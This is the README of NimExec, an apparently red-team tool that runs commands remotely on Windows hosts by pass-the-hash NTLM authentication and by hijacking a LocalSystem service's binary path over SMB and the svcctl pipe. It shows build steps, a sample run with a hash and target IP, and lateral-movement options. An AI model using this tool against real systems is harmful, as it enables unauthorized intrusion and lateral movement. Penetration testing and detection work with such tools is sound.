# NimExec
Basically, NimExec is a fileless remote command execution tool that uses The Service Control Manager Remote Protocol (MS-SCMR). It changes the binary path of a random or given service run by LocalSystem to execute the given command on the target and restores it later via hand-crafted RPC packets instead of WinAPI calls. It sends these packages over SMB2 and the svcctl named pipe.

NimExec needs an NTLM hash to authenticate to the target machine and then completes this authentication process with the NTLM Authentication method over hand-crafted packages.

Since all required network packages are manually crafted and no operating system-specific functions are used, NimExec can be used in different operating systems by using Nim's cross-compilability support.

This project was inspired by [Julio's SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec) tool. You can think that NimExec is Cross Compilable and built-in Pass the Hash supported version of SharpNoPSExec. Also, I learned the required network packet structures from [Kevin Robertson's Invoke-SMBExec Script](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1).


# Compilation
```
nim c -d:release --gc:markAndSweep -o:NimExec.exe Main.nim
```

The above command uses a different Garbage Collector because the default garbage collector in Nim is throwing some SIGSEGV errors during the service searching process.

Also, you can install the required Nim modules via Nimble with the following command:

```
nimble install ptr_math nimcrypto hostname
```
# Usage
```
test@ubuntu:~/Desktop/NimExec$ ./NimExec -u testuser -d TESTLABS -h 123abcbde966780cef8d9ec24523acac -t 10.200.2.2 -c 'cmd.exe /c "echo test > C:\Users\Public\test.txt"' -v
 
                                                                                             _..._     
                                                                                          .-'_..._''.  
   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\ 
 .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'            
.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '              
|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |              
|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |              
|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '              
|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          . 
|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/ 
|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /  
|  |   |  |                                        .'   /    `.   `.                               `   
'--'   '--'                                       '----'       '----'                                  

                                            @R0h1rr1m          


[+] Connected to 10.200.2.2:445
[+] NTLM Authentication with Hash is succesfull!
[+] Connected to IPC Share of target!
[+] Opened a handle for svcctl pipe!
[+] Bound to the RPC Interface!
[+] RPC Binding is acknowledged!
[+] SCManager handle is obtained!
[+] Number of obtained services: 265
[+] Selected service is LxpSvc
[+] Service: LxpSvc is opened!
[+] Previous Service Path is: C:\Windows\system32\svchost.exe -k netsvcs
[+] Service config is changed!
[!] StartServiceW Return Value: 1053 (ERROR_SERVICE_REQUEST_TIMEOUT)
[+] Service start request is sent!
[+] Service config is restored!
[+] Service handle is closed!
[+] Service Manager handle is closed!
[+] SMB is closed!
[+] Tree is disconnected!
[+] Session logoff!
```

It's tested against Windows 10&11, Windows Server 16&19&22 from Ubuntu 20.04 and Windows 10 machines.
# Command Line Parameters

``` 
    -v | --verbose                          Enable more verbose output.
    -u | --username <Username>              Username for NTLM Authentication.*
    -h | --hash <NTLM Hash>                 NTLM password hash for NTLM Authentication.**
    -p | --password <Password>              Plaintext password.**
    -t | --target <Target>                  Lateral movement target.*
    -c | --command <Command>                Command to execute.*
    -d | --domain <Domain>                  Domain name for NTLM Authentication.
    -s | --service <Service Name>           Name of the service instead of a random one.
    --help                                  Show the help message.

```

# References

- https://github.com/juliourena/SharpNoPSExec
- https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1
- https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SCMR/%5bMS-SCMR%5d.pdf
- https://github.com/jborean93/pypsexec/tree/master
- https://www.x86matthew.com/view_post?id=create_svc_rpc
